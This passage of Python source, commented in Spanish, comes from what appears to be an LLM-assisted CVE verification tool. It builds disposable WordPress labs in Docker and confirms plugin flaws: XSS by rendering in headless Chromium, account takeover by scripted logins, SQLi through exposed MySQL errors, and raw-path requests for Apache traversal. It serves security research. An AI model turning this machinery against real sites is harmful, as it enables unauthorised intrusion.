        from playwright.sync_api import sync_playwright
        from .. import chromium_launch_kwargs
    except Exception:
        return None
    import base64
    import concurrent.futures as _cf
    import tempfile
    from urllib.parse import urlsplit
    host = urlsplit(base_url).hostname or "127.0.0.1"
    cookies = [{"name": c.name, "value": c.value, "domain": host, "path": "/"} for c in session.cookies]
    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)

    def _do() -> Optional[str]:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(**chromium_launch_kwargs())
            try:
                ctx = browser.new_context(viewport={"width": 1280, "height": 900})
                ctx.add_cookies(cookies)
                page = ctx.new_page()
                # domcontentloaded fires before deferred AJAX; full_page=True triggers lazy
                # loads that can keep pending HTTP requests open and hang browser.close().
                page.goto(base_url + path, wait_until="domcontentloaded", timeout=12000)
                page.screenshot(path=out_path)
                try:
                    page.close(run_before_unload=False)
                except Exception:
                    pass
                try:
                    ctx.close()
                except Exception:
                    pass
            finally:
                browser.close()
        with open(out_path, "rb") as fh:
            return base64.b64encode(fh.read()).decode("ascii")

    try:
        # Hard timeout: wp-admin pages keep pending AJAX that can hang sync_playwright().__exit__
        # indefinitely. Running in a thread lets us abandon the Playwright process cleanly.
        with _cf.ThreadPoolExecutor(max_workers=1) as executor:
            return executor.submit(_do).result(timeout=30)
    except Exception:
        return None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


def _screenshot_failed_login(base_url: str, user: str, wrong_password: str) -> Optional[str]:
    """Automatiza el FORMULARIO real de wp-login.php (Playwright, no una peticion POST cruda) con
    una password y captura la pantalla resultante. Se usa DESPUES del ataque, con la password
    ORIGINAL del admin -- si el ataque de verdad la sobreescribio, WordPress debe rechazarla, y
    esta funcion deja la pantalla de error real como prueba (no solo lo deducimos por logica).
    Mismo patron de degradacion honesta que _screenshot_authenticated: sin Playwright, None."""
    try:
        from playwright.sync_api import sync_playwright
        from .. import chromium_launch_kwargs
    except Exception:
        return None
    import base64
    import concurrent.futures as _cf
    import tempfile
    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)

    def _do() -> Optional[str]:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(**chromium_launch_kwargs())
            try:
                _ctx = browser.new_context(viewport={"width": 1280, "height": 900})
                page = _ctx.new_page()
                page.goto(base_url + "/wp-login.php", wait_until="domcontentloaded", timeout=12000)
                page.fill("#user_login", user)
                page.fill("#user_pass", wrong_password)
                page.click("#wp-submit")
                page.wait_for_load_state("domcontentloaded", timeout=10000)
                page.screenshot(path=out_path)
                try:
                    page.close(run_before_unload=False)
                except Exception:
                    pass
                try:
                    _ctx.close()
                except Exception:
                    pass
            finally:
                browser.close()
        with open(out_path, "rb") as fh:
            return base64.b64encode(fh.read()).decode("ascii")

    try:
        with _cf.ThreadPoolExecutor(max_workers=1) as executor:
            return executor.submit(_do).result(timeout=30)
    except Exception:
        return None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


def _xss_render(base_url: str, endpoint: str, method: str, params: dict, cookies: list,
                timeout_ms: int = 15000):
    """Carga la respuesta del endpoint en un Chromium headless REAL (Playwright) -- GET navega
    directamente con los parametros en la query, POST los manda via un formulario auto-enviado
    (pagina data: URL, igual que haria una pagina ajena que la victima visita) -- y devuelve el
    document.title final mas una captura de pantalla. No basta ver el payload reflejado en el
    HTML crudo: solo si el MOTOR JS del navegador lo ejecuto de verdad el title cambia al marcador
    que el payload pide. Devuelve (None, None) si Playwright no esta disponible o algo falla
    (degradacion honesta, igual que _screenshot_authenticated)."""
    try:
        from playwright.sync_api import sync_playwright
        from .. import chromium_launch_kwargs
    except Exception:
        return None, None
    import base64
    import html as _html
    import tempfile
    from urllib.parse import quote, urlencode
    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(**chromium_launch_kwargs())
            try:
                ctx = browser.new_context(viewport={"width": 1280, "height": 900})
                if cookies:
                    ctx.add_cookies(cookies)
                page = ctx.new_page()
                if method == "GET":
                    url = base_url + endpoint + ("&" if "?" in endpoint else "?") + urlencode(params)
                    page.goto(url, wait_until="load", timeout=timeout_ms)
                else:
                    inputs = "".join(
                        f'<input type="hidden" name="{_html.escape(str(k))}" '
                        f'value="{_html.escape(str(v))}">' for k, v in params.items())
                    form_html = (f'<html><body><form id="f" method="POST" '
                                f'action="{base_url + endpoint}">{inputs}</form>'
                                f'<script>document.getElementById("f").submit()</script>'
                                f'</body></html>')
                    page.goto("data:text/html," + quote(form_html), timeout=timeout_ms)
                page.wait_for_timeout(800)
                title = page.title()
                page.screenshot(path=out_path, full_page=True)
                try:
                    page.close(run_before_unload=False)
                except Exception:
                    pass
                try:
                    ctx.close()
                except Exception:
                    pass
            finally:
                browser.close()
        with open(out_path, "rb") as f:
            png = base64.b64encode(f.read()).decode("ascii")
        return title, png
    except Exception:
        return None, None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


class _XssBrowserSession:
    """Reusa UN SOLO Chromium headless (Playwright) a lo largo de muchos intentos, en vez de
    arrancar un proceso de navegador por cada payload -- confirmado en vivo que, con las ~500
    variantes de xss_alert_identifiable.txt (ver payload_kb.py) sumadas a las elegidas a mano, un
    `with sync_playwright() as pw: browser = pw.chromium.launch()` POR INTENTO (el patron
    original de _xss_render) tardaba minutos; el arranque del propio Chromium es el coste real,
    no la navegacion entre paginas. Tambien evita gastar tiempo en page.screenshot() para cada
    intento fallido -- solo se captura cuando `capture=True` (el intento ganador)."""

    def __enter__(self):
        from playwright.sync_api import sync_playwright
        from .. import chromium_launch_kwargs
        self._pw_cm = sync_playwright()
        self._pw = self._pw_cm.__enter__()
        # el fix de version/ejecutable de Chromium vive en binoracle.chromium_launch_kwargs()
        # (extraido de aqui: este era el UNICO sitio que lo tenia bien -- ver su docstring).
        self._browser = self._pw.chromium.launch(**chromium_launch_kwargs())
        return self

    def __exit__(self, *exc):
        try:
            self._browser.close()
        except Exception:
            pass
        try:
            self._pw_cm.__exit__(*exc)
        except Exception:
            pass
        return False

    def render(self, base_url: str, endpoint: str, method: str, params: dict, cookies: list,
              timeout_ms: int = 15000, capture: bool = False,
              wait_for_xss_title: str = ""):
        """Misma semantica que _xss_render (navega, devuelve (title, png)) pero sobre el
        navegador YA arrancado -- `png` es None salvo que `capture=True`.
        `wait_for_xss_title`: si se da, espera hasta que document.title empiece por ese
        prefijo (o pase el timeout); utill para stored-XSS con AJAX (ej. WP Statistics)."""
        import html as _html
        from urllib.parse import quote, urlencode
        try:
            ctx = self._browser.new_context(viewport={"width": 1280, "height": 900})
            page = None
            try:
                if cookies:
                    ctx.add_cookies(cookies)
                page = ctx.new_page()
                # Bound ALL navigation and wait calls so a stalled page can never
                # block ctx.close() indefinitely (WPS stats overview keeps pending
                # AJAX requests open; without page.close() first ctx.close() hangs
                # forever waiting for network idle).
                page.set_default_navigation_timeout(timeout_ms)
                page.set_default_timeout(timeout_ms)
                if method == "GET":
                    url = base_url + endpoint + ("&" if "?" in endpoint else "?") + urlencode(params)
                    page.goto(url, wait_until="load", timeout=timeout_ms)
                else:
                    inputs = "".join(
                        f'<input type="hidden" name="{_html.escape(str(k))}" '
                        f'value="{_html.escape(str(v))}">' for k, v in params.items())
                    form_html = (f'<html><body><form id="f" method="POST" '
                                f'action="{base_url + endpoint}">{inputs}</form>'
                                f'<script>document.getElementById("f").submit()</script>'
                                f'</body></html>')
                    page.goto("data:text/html," + quote(form_html), timeout=timeout_ms)
                if wait_for_xss_title:
                    _pfx = wait_for_xss_title.replace("'", "\\'")
                    try:
                        page.wait_for_function(
                            f"document.title.startsWith('{_pfx}')",
                            timeout=8000)
                    except Exception:
                        pass
                else:
                    page.wait_for_timeout(400)
                title = page.title()
                png = None
                if capture:
                    import base64
                    import tempfile
                    fd, out_path = tempfile.mkstemp(suffix=".png")
                    os.close(fd)
                    try:
                        page.screenshot(path=out_path, full_page=True)
                        with open(out_path, "rb") as f:
                            png = base64.b64encode(f.read()).decode("ascii")
                    finally:
                        try:
                            os.unlink(out_path)
                        except OSError:
                            pass
                return title, png
            finally:
                # Close the page first (skipping unload handlers + aborting pending
                # requests) so ctx.close() finds nothing pending and returns fast.
                if page is not None:
                    try:
                        page.close(run_before_unload=False)
                    except Exception:
                        pass
                try:
                    ctx.close()
                except Exception:
                    pass
        except Exception:
            return None, None


# si se configura (ver configure_burp_mcp), TODAS las peticiones de TODOS los verificadores --
# genericos (genericverify.py, que importa esto de aqui en vez de tener su propia copia) y los
# CMS-especificos (via _make_session(), usada por _wp_login/el login de Drupal/Joomla) -- pasan
# por Burp (su extension MCP oficial, ver burpmcp.py) en vez de mandarse directo con `requests`.
# Vive aqui (el modulo "comun" del que ya importan _docker_daemon_ok/_token/etc. el resto de
# verificadores) para que haya un UNICO estado compartido, no una copia por modulo que alguien
# pueda olvidar configurar.
_burp_client = None


def configure_burp_mcp(sse_url: str, timeout: float = 20.0):
    """Conecta al servidor MCP de la extension de Burp (github.com/PortSwigger/mcp-server). Lanza
    BurpMCPError si no puede conectar (p.ej. la extension no esta cargada/activada en Burp) --
    se llama una vez, antes de arrancar las investigaciones (ver cli.py/web.py --burp-mcp-url)."""
    global _burp_client
    from .burpmcp import BurpMCPClient
    if _burp_client is not None:
        _burp_client.close()
    _burp_client = BurpMCPClient(sse_url, timeout=timeout)
    _burp_client.connect()


def _http_request(method: str, url: str, **kwargs):
    if _burp_client is not None:
        from .burpmcp import BurpHttpTransport
        return BurpHttpTransport(_burp_client).request(method, url, **kwargs)
    import requests
    return requests.request(method, url, **kwargs)


def _http_request_raw_path(method: str, url: str, timeout: float = 15):
    """Como _http_request pero SIN normalizar los secuencias percent-encoded en el path de la URL.
    requests.request() llama a PreparedRequest.prepare_url() que decodifica %2e a '.' antes de
    enviar la peticion -- exactamente lo que rompe CVE-2021-41773 y CVE-2021-42013 (Apache 2.4.49/
    2.4.50), cuyo bypass requiere que el servidor vea '.%2e' o '%2e%2e' sin normalizar.
    urllib.request.urlopen usa http.client que envia el path tal cual, sin tocar el encoding.
    Solo usable para GET sin body ni cookies -- suficiente para verificacion de path-traversal
    en URL_PATH mode donde el payload va en el path, no en un parametro POST."""
    import urllib.request
    import urllib.error

    class _Resp:
        def __init__(self, status, text, reason="", headers=None):
            self.status_code = status
            self.text = text
            self.reason = reason
            self.headers = headers or {}

    try:
        req = urllib.request.Request(url, method=method.upper())
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read().decode("utf-8", errors="replace")
            _hdrs = dict(r.info())
            return _Resp(r.status, body, reason=getattr(r, "reason", ""), headers=_hdrs)
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        _hdrs = dict(e.info()) if hasattr(e, "info") else {}
        return _Resp(e.code, body, reason=getattr(e, "reason", ""), headers=_hdrs)
    except Exception:
        return _Resp(0, "")


def _make_session():
    """Sesion con cookies persistentes entre peticiones -- requests.Session() normal, o (si se
    configuro Burp) BurpSession, que manda cada peticion real a traves de Burp y mantiene las
    mismas cookies que un requests.Session() mantendria, para que el login/flujo de sesion de
    los verificadores CMS-especificos funcione exactamente igual por dentro."""
    if _burp_client is not None:
        from .burpmcp import BurpSession
        return BurpSession(_burp_client)
    import requests
    return requests.Session()


def _wp_login(base_url: str, user: str, password: str, timeout: float = 30.0,
             on_step: Optional[Callable[[str], None]] = None):
    """Login real por cookie de WordPress (wp-login.php). Devuelve una requests.Session (o
    BurpSession, si se configuro Burp) logueada, o None si no hay cookie de sesion (login
    fallido).

    Confirmado en vivo: con los 15s originales, el login fallaba con TimeoutError bajo carga real
    del Mac (varios laboratorios Docker a la vez, o simplemente Apache/PHP bajo emulacion amd64
    yendo lento en ese momento) -- el mismo laboratorio, en otra ejecucion, habia logueado bien.
    Subido con margen generoso por la misma razon que mysql_ready/http_ready ya lo tienen (ver sus
    comentarios): Docker Desktop en Apple Silicon corriendo imagenes amd64 via emulacion puede
    tardar bastante mas de lo que un login normal tardaria en nativo.

    `on_step`, si se da, recibe el motivo CONCRETO del fallo (la excepcion real, o que la
    respuesta no trajo cookie de sesion con su status code) -- confirmado en vivo: antes de
    esto, un fallo de login (de Burp, de red, o de WordPress rechazando las credenciales) SIEMPRE
    se veia igual desde fuera ('no se pudo iniciar sesion'), sin forma de saber CUAL de esas tres
    cosas paso realmente sin instrumentar el codigo a mano cada vez.

    Usa requests.Session() DIRECTAMENTE, nunca _make_session() -- este login es parte del
    laboratorio efimero, que nunca debe ir por Burp aunque este configurado (ver _lab_host())."""
    import requests
    s = requests.Session()
    try:
        r = s.post(f"{base_url}/wp-login.php",
                  data={"log": user, "pwd": password, "wp-submit": "Log In",
                        "redirect_to": f"{base_url}/wp-admin/", "testcookie": "1"},
                  timeout=timeout, allow_redirects=True)
    except Exception as e:
        if on_step:
            on_step(f"_wp_login({user!r}): peticion a wp-login.php fallo: {type(e).__name__}: {e}")
        return None
    logged_in = any(c.name.startswith("wordpress_logged_in_") for c in s.cookies)
    if not logged_in and on_step:
        on_step(f"_wp_login({user!r}): sin cookie de sesion en la respuesta "
               f"(status={getattr(r, 'status_code', '?')}, "
               f"cuerpo[:200]={(getattr(r, 'text', '') or '')[:200]!r})")
    return s if logged_in else None


def _check_prereqs(plugin_source_dir: str, slug: str) -> Optional[WpVerifyResult]:
    """Comprobaciones compartidas por todos los verificadores dinamicos (Docker daemon alcanzable,
    el codigo del plugin tiene la forma esperada). Devuelve un WpVerifyResult YA poblado si algo
    falla (el caller solo tiene que `return`lo), o None si todo esta en orden para seguir."""
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        if not shutil.which("docker"):
            res.detail = "sin cliente docker instalado"
            res.limitations.append("verificacion dinamica NO intentada: el CLI de `docker` no "
                                   "esta instalado en este contenedor (reconstruye la imagen: "
                                   "`docker compose up --build`, ya deberia traerlo)")
        else:
            res.detail = "sin daemon Docker alcanzable"
            res.limitations.append("verificacion dinamica NO intentada: el CLI de docker esta, "
                                   "pero no se alcanza ningun daemon. Si corres binoracle dentro "
                                   "de Docker, monta el socket del host en docker-compose.yml "
                                   "(/var/run/docker.sock:/var/run/docker.sock) y confirma que "
                                   "Docker Desktop/dockerd esta arrancado en tu maquina")
        return res
    if not os.path.isdir(os.path.join(plugin_source_dir, slug)):
        res.detail = f"no se encuentra {slug}/ dentro de {plugin_source_dir}"
        res.limitations.append("el codigo del plugin no tiene la forma esperada (<slug>/...)")
        return res
    return None


@dataclass
class _LabSession:
    """Laboratorio YA levantado hasta el punto comun a TODOS los verificadores dinamicos: WordPress
    instalado, plugin activo, subscriber creado y logueado -- lo unico que cambia entre un
    account-takeover por password y un login-as directo es lo que se hace A PARTIR de aqui."""
    lab: "_Lab"
    base_url: str
    admin_id: str
    admin_user: str
    admin_pass: str
    sub_user: str
    sub_pass: str
    sub_sess: object           # requests.Session, YA autenticada como el subscriber
    admin_sess: object         # requests.Session, autenticada como el admin CON SU PASSWORD ORIGINAL
    shots: list
    capture: Callable
    http_captures: list = field(default_factory=list)
    shortcode_page_path: Optional[str] = None  # "/?page_id=N" de la pagina creada con el
    # shortcode real del plugin (si se pidio via shortcode_name) -- None si no se pidio o si
    # la creacion fallo.
    directory_hash: Optional[str] = None      # Hash derivado del CPT post ID cuando el plugin
    # usa SUBSTRING(MD5(ID),N,L) como directory_id — confirmado via MySQL en _bootstrap_lab y
    # usado directamente en base_params sin fuerza bruta (que falla si nonce es incorrecto).
    db_pw: str = ""                           # Password de MySQL del lab (para exec_mysql / seed data)


_WP_STANDARD_ROLES = {"subscriber", "contributor", "author", "editor", "administrator"}


def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: WpVerifyResult,
                   t0: float, budget_s: float,
                   setup_wp_options: Optional[list] = None,
                   companion_plugins: Optional[list] = None,
                   shortcode_name: Optional[str] = None,
                   relationship_table: Optional[dict] = None,
                   wp_debug_display: bool = False,
                   extra_setup_trigger_paths: Optional[list] = None,
                   required_role: str = "subscriber") -> Optional[_LabSession]:
    """Pasos 1-4 compartidos (ver _LabSession). Devuelve None si algo falla, con `res` ya relleno
    (detail/logs/limitations) -- el caller solo tiene que `return res` sin mas logica.

    `setup_wp_options`, si se da, es una lista de {"name": ..., "value": ...} -- opciones de
    WordPress/del plugin que hay que activar ANTES de probar el ataque para que el codigo
    vulnerable se llegue siquiera a ejecutar (confirmado en vivo con CVE-2024-1071: el SQLi real
    esta en la clase que solo se usa cuando el plugin tiene activada la opcion 'tabla personalizada
    para usermeta' -- con la configuracion de fabrica, el codigo vulnerable nunca se alcanzaba, asi
    que ninguna tecnica de deteccion podia encontrar nada por mucho que probara. Viene de que el
    LLM lea el codigo real alrededor de la funcion vulnerable confirmada (ver
    _refine_web_hints_from_source en cve_agent.py) -- no es un fallback generico, es la misma idea
    de 'leer el codigo real en vez de adivinar' ya aplicada a endpoint/parametros, extendida a
    los REQUISITOS para llegar a ese codigo.

    `companion_plugins`, si se da, es una lista de slugs de WordPress.org (p.ej. ['woocommerce'])
    que se instalan y activan ANTES del plugin objetivo -- confirmado en vivo con CVE-2024-50508:
    el constructor del plugin corta en seco (`return false`) antes de registrar NINGUN hook si
    WooCommerce no esta activo, asi que la verificacion dinamica fallaba siempre sin importar el
    payload, porque el codigo vulnerable nunca llegaba a cargarse. Viene de
    detect_required_companion_plugins() en websource.py, que detecta este patron (in_array()/
    is_plugin_active() contra 'active_plugins') leyendo el codigo real -- misma idea que
    setup_wp_options, pero para 'que otro plugin tiene que estar activo', no 'que opcion'.

    `shortcode_name`, si se da, crea una pagina de WordPress real con `[shortcode_name]` como
    contenido (via wp-cli) justo despues de activar el plugin -- confirmado en vivo con
    CVE-2024-3552: atacar la portada por defecto ('/'), que no muestra NADA del plugin, no puede
    reflejar ninguna diferencia booleana ni fila UNION aunque la inyeccion sea real, porque no
    hay ninguna superficie visible donde el resultado del query pueda aparecer. Con una pagina
    de verdad que invoca el shortcode del plugin (ver find_shortcode_name() en websource.py), el
    verificador puede atacar ESA pagina en vez de adivinar. La URL resultante (relativa, tipo
    '/?page_id=N' -- funciona independientemente de la estructura de permalinks activa) queda en
    `shortcode_page_path` de la _LabSession devuelta; None si no se pidio o si la creacion
    fallo (se registra como limitacion, nunca aborta el resto del laboratorio).

    `relationship_table`, si se da (ver find_join_relationship_table() en websource.py: un
    LEFT JOIN propio del plugin que enlaza por post ID), inserta una fila real para la pagina
    del shortcode en esa tabla ANTES del ataque -- confirmado en vivo con CVE-2024-3552: sin
    ella, el JOIN deja esa columna NULL para cualquier pagina generica (incluida la del
    shortcode) y el WHERE del sumidero nunca es verdadero, inyeccion real o no. Solo tiene
    efecto si `shortcode_name` tambien se dio (no hay pagina a la que enlazar la fila sin eso).

    `extra_setup_trigger_paths`, si se da, son rutas EXTRA (ademas de las ya conocidas en
    _PLUGIN_SETUP_TRIGGER_PATHS para este `slug`) a visitar como admin tras el login -- pensado
    para que el bucle de aprendizaje-y-reintento del LLM (cve_agent.py, _SQLI_RETRY_SYS,
    'pagina_setup_admin_requerida') pueda señalar la URL de configuracion de un plugin NUEVO
    (no visto antes, por eso no esta en el registro) cuando reconoce el mismo sintoma -- ninguna
    pagina del sitio muestra nada del plugin -- en vez de quedarse bloqueado para siempre hasta
    que alguien añada esa entrada a mano."""
    root_pw, db_pw = secrets.token_urlsafe(16), secrets.token_urlsafe(16)
    admin_user, admin_pass = "binoracle_admin", secrets.token_urlsafe(12)
    sub_user, sub_pass = "binoracle_subscriber", secrets.token_urlsafe(12)
    shots: List[dict] = []
    ctx = {}

    def capture(sess_, url_path, es_caption, en_caption):
        if "base_url" not in ctx:
            return
        # Always visit the page as admin — without this, plugins that gate their
        # table creation on is_admin() && current_user_can('manage_options') (e.g.
        # Events Manager em_install()) never create their DB tables, because the
        # screenshot-only path is a no-op when Playwright is not installed.
        try:
            sess_.get(ctx["base_url"] + url_path, timeout=20)
        except Exception:
            pass
        png = _screenshot_authenticated(ctx["base_url"], sess_, url_path)
        if png:
            shots.append({"caption_es": es_caption, "caption_en": en_caption, "png_b64": png,
                         "url": ctx["base_url"] + url_path})

    # Launch source analysis in background while Docker spins up (60-80s).
    # By the time the plugin is activated the analysis is done and its gating
    # hints can be applied before the first probe — zero extra wall-clock cost.
    import concurrent.futures as _cfe
    _src_executor = _cfe.ThreadPoolExecutor(max_workers=1, thread_name_prefix="binoracle-src")
    try:
        from .engine import UniversalEngine as _UE
        _src_future: Optional[_cfe.Future] = _src_executor.submit(
            _UE().analyze_plugin_source, plugin_source_dir, slug)
    except Exception:
        _src_future = None

    step("levantando laboratorio WordPress+MySQL aislado en Docker (red/volumen propios)...")
    try:
        lab.setup_network_and_volume()
    except RuntimeError as _net_err:
        res.detail = f"docker network create falló: {_net_err}"
        step(f"[ERROR] {_net_err} -- limpia redes huérfanas con: docker network prune -f")
        return None
    lab.start_mysql(root_pw, db_pw)
    if not lab.mysql_ready(db_pw):
        step("ERROR: MySQL no respondio a tiempo -- contenedor MySQL no paso el healthcheck "
             "dentro del limite (posible contención de Docker si hay varios labs simultáneos)")
        res.detail = "MySQL no respondio a tiempo"
        res.logs.append("docker logs (mysql):\n" + lab.logs_tail(lab.mysql))
        res.evidence["screenshots"] = shots
        return None
    step("MySQL listo; arrancando WordPress...")
    port = lab.start_wordpress(db_pw)
    if not port:
        step("ERROR: no se pudo publicar el puerto de WordPress -- start_wordpress devolvio None")
        res.detail = "no se pudo publicar el puerto de WordPress"
        res.logs.append("docker logs (wordpress):\n" + lab.logs_tail(lab.wp))
        res.evidence["screenshots"] = shots
        return None
    if not lab.http_ready(port):
        step(f"ERROR: WordPress no respondio a tiempo en {port} -- HTTP no disponible dentro del limite")
        res.detail = "WordPress no respondio a tiempo"
        res.logs.append("docker logs (wordpress):\n" + lab.logs_tail(lab.wp))
        res.evidence["screenshots"] = shots
        return None
    base_url = f"http://{_lab_host()}:{port}"
    ctx["base_url"] = base_url
    step(f"WordPress listo en {base_url}; instalando core via wp-cli...")

    r = lab.wp_cli("core", "install", f"--url={base_url}", "--title=binoracle-lab",
                   f"--admin_user={admin_user}", f"--admin_password={admin_pass}",
                   "--admin_email=admin@binoracle-lab.invalid", "--skip-email", timeout=90)
    if r.returncode != 0:
        _wp_install_err = (r.stderr or r.stdout or "")[:300]
        res.detail = f"wp core install fallo: {_wp_install_err}"
        step(f"[ERROR] wp core install fallo -- {_wp_install_err}")
        res.evidence["screenshots"] = shots
        return None
    # Bug real confirmado en vivo investigando CVE-2026-2991 (KiviCare): `wp core install` deja
    # la estructura de permalinks en "plain" (?p=123) por defecto -- con eso, cualquier endpoint
    # `/wp-json/...` (register_rest_route(), el patron CADA VEZ mas comun en plugins nuevos en
    # vez del viejo admin-ajax.php) NO reescribe de verdad: WordPress devuelve la portada HTML
    # con 200 en vez de la respuesta JSON de la ruta REST, silenciosamente -- cada verificador
    # que ataca o confirma via /wp-json/ (este incluido) fallaba siempre, sin relacion alguna con
    # si la vulnerabilidad es real. Todos los CVEs reales investigados ANTES en este proyecto
    # (CVE-2024-1071/3552/43982/50508) resultaron ser admin-ajax.php, que funciona igual con
    # cualquier estructura de permalinks -- por eso este hueco no se habia notado hasta ahora.
    lab.wp_cli("rewrite", "structure", "/%postname%/", timeout=30)
    lab.wp_cli("rewrite", "flush", timeout=30)
    # WP_DEBUG siempre activo en el laboratorio efimero -- confirmado en vivo, CVE-2024-3552:
    # sin esto, wpdb oculta cualquier error real de MySQL (p.ej. el que provocan a proposito
    # extractvalue()/updatexml() en el error-based) y, desde WP 5.2, un fatal error de PHP se
    # sustituye por la pantalla generica "ha ocurrido un error critico". Un laboratorio de
    # pruebas propio, efimero, no es el objetivo final del analista: no hay nada que proteger
    # activando esto solo aqui.
    #
    # WP_DEBUG_DISPLAY, en cambio, SOLO se activa cuando `wp_debug_display=True` (lo pide
    # verify_wordpress_sqli para su tecnica error-based, que necesita LEER el error de MySQL
    # tal cual sale en el cuerpo HTTP). Bug real encontrado en vivo, CVE-2024-1071 (Ultimate
    # Member): con WP_DEBUG_DISPLAY=true activado SIEMPRE para TODO verificador, un simple aviso
    # de PHP totalmente ajeno a la inyeccion (p.ej. "_load_textdomain_just_in_time called
    # incorrectly", del propio plugin cargando su dominio de traduccion demasiado pronto) se
    # imprimia como HTML ANTES de que WordPress pudiera mandar la cabecera Set-Cookie del login
    # -- "headers already sent" silencioso, sin error visible, deja el login sin cookie de
    # sesion para CUALQUIER verificador (XSS, SSRF, account-takeover, CSRF...), no solo SQLi.
    # Con WP_DEBUG_LOG=true (siempre activo) los errores/avisos se escriben en debug.log sin
    # tocar la respuesta HTTP -- visibles igual via `docker exec` si hiciera falta depurar,
    # pero sin romper ningun login.
    lab.wp_cli("config", "set", "WP_DEBUG", "true", "--raw", "--type=constant", timeout=30)
    lab.wp_cli("config", "set", "WP_DEBUG_LOG", "true", "--raw", "--type=constant", timeout=30)
    lab.wp_cli("config", "set", "WP_DEBUG_DISPLAY", "true" if wp_debug_display else "false",
              "--raw", "--type=constant", timeout=30)
    # WordPress 5.0+ no llama automaticamente a $wpdb->show_errors() cuando WP_DEBUG=true.
    # En WP 4.x lo hacia desde wp-settings.php, pero desde 5.0 eso se elimino.
    # Sin show_errors(), los errores MySQL (XPATH errors de extractvalue/updatexml) van al
    # debug.log pero NO al cuerpo HTTP -- error-based SQLi no puede detectar version().
    # Solucion: instalar un mu-plugin que llame show_errors() en cada peticion web.
    # Usamos base64 para evitar problemas de escaping entre Python repr() y PHP single-quotes
    # (repr() escapa \n como \\n — el archivo PHP quedaria con backslash-n literal en vez de
    # saltos de linea reales, causando parse error en PHP al cargar el mu-plugin).
    import base64 as _b64
    _muplugin_code = (
        "<?php\n"
        "// binoracle MU-plugin: dos funciones para los laboratorios efimeros\n"
        "//\n"
        "// 1. ob_start() inmediato: algunos plugins viejos hacen echo/print durante su\n"
        "//    inicializacion (antes de que WordPress pueda enviar cabeceras HTTP). Sin\n"
        "//    output buffering, ese output prematuro hace que setcookie() falle\n"
        "//    silenciosamente ('headers already sent') y el login del subscriber nunca\n"
        "//    obtiene su cookie de sesion. ob_start() aqui captura ese output antes de\n"
        "//    que llegue al cliente; ob_end_flush() al final del request lo libera.\n"
        "ob_start();\n"
        "add_action('shutdown', function() { while (ob_get_level() > 0) ob_end_flush(); }, 999);\n"
        "//\n"
        "// 2. show_errors() de wpdb en cada peticion web\n"
        "// (WP 5.0+ no llama show_errors() automaticamente con WP_DEBUG=true)\n"
        "add_action('init', function() { global $wpdb; $wpdb->show_errors(); }, 1);\n"
    )
    _muplugin_b64 = _b64.b64encode(_muplugin_code.encode()).decode()
    lab.wp_cli("eval",
        f"@mkdir(WPMU_PLUGIN_DIR, 0755, true); "
        f"file_put_contents(WPMU_PLUGIN_DIR . '/binoracle-sqli-debug.php', "
        f"base64_decode('{_muplugin_b64}'));",
        timeout=15)
    admin_id = lab.wp_cli("user", "get", admin_user, "--field=ID", timeout=30).stdout.strip()
    if not admin_id:
        # En un WordPress recién instalado el primer usuario siempre es id=1; usar como fallback.
        admin_id = "1"
        step("wp user get no devolvio el ID del admin -- usando id=1 (fallback para WP fresh install)")
    step(f"WordPress instalado; admin id={admin_id}")
    step("capturando pantalla: WordPress recien instalado y en pie (laboratorio en vivo)...")
    import requests as _requests
    capture(_requests.Session(), "/wp-login.php",
           "Paso 1: WordPress recien instalado y accesible (laboratorio en vivo, antes de "
           "tocar nada).",
           "Step 1: WordPress freshly installed and reachable (live lab, before anything "
           "is touched).")

    if companion_plugins:
        for comp_slug in companion_plugins:
            step(f"instalando y activando '{comp_slug}' (WordPress.org) -- el plugin objetivo "
                 f"lo necesita activo para registrar siquiera su propia funcionalidad...")
            r_comp = lab.wp_cli("plugin", "install", comp_slug, "--activate", timeout=120)
            if r_comp.returncode != 0:
                res.limitations.append(
                    f"no se pudo instalar/activar el plugin companero requerido "
                    f"'{comp_slug}': {(r_comp.stderr or r_comp.stdout or '')[:200]} -- sin el, "
                    f"el plugin objetivo puede no registrar ningun hook y el ataque fallar "
                    f"siempre independientemente del payload")

    step(f"copiando el plugin ({slug}) al volumen e instalandolo...")
    _install_ok = False
    try:
        _install_ok = lab.install_plugin(plugin_source_dir, slug)
    except Exception as _inst_exc:
        step(f"ERROR: install_plugin lanzó excepción para '{slug}': {type(_inst_exc).__name__}: {_inst_exc}")
        res.detail = f"install_plugin excepción: {_inst_exc}"
        res.evidence["screenshots"] = shots
        return None
    if not _install_ok:
        step(f"ERROR: install_plugin devolvio False para '{slug}' -- copia/timeout fallida")
        res.detail = "no se pudo copiar el plugin al laboratorio"
        res.evidence["screenshots"] = shots
        return None
    step(f"plugin copiado al volumen; activando '{slug}' via wp-cli...")
    r = lab.wp_cli("plugin", "activate", slug, timeout=90)
    # DNS race: on slow hosts the DB container may not be resolvable yet when WordPress
    # tries to connect for the first time. Retry once after a brief wait.
    _activate_combined = (r.stderr or "") + (r.stdout or "")
    if r.returncode != 0 and "getaddrinfo" in _activate_combined:
        import time as _t
        _t.sleep(5)
        r = lab.wp_cli("plugin", "activate", slug, timeout=90)
        _activate_combined = (r.stderr or "") + (r.stdout or "")
    # wp-cli "not a WordPress installation" — WP not yet ready at /var/www/html/ (slow container
    # init). Retry once with --path to be explicit, after a brief wait.
    if r.returncode != 0 and "not seem to be a WordPress" in _activate_combined:
        import time as _t
        _t.sleep(8)
        r = lab.wp_cli("plugin", "activate", slug, "--path=/var/www/html", timeout=90)
    # WP-CLI puede morir durante el hook de activacion sin escribir en active_plugins --
    # confirmado en vivo con KiviCare 4.1.2: WP_CLI::add_command() con KCScaffold (clase
    # inexistente en el modo CLI de esta version) llama exit(1) ANTES de que WordPress
    # haya escrito active_plugins, aunque la secuencia normal de activate_plugin() lo
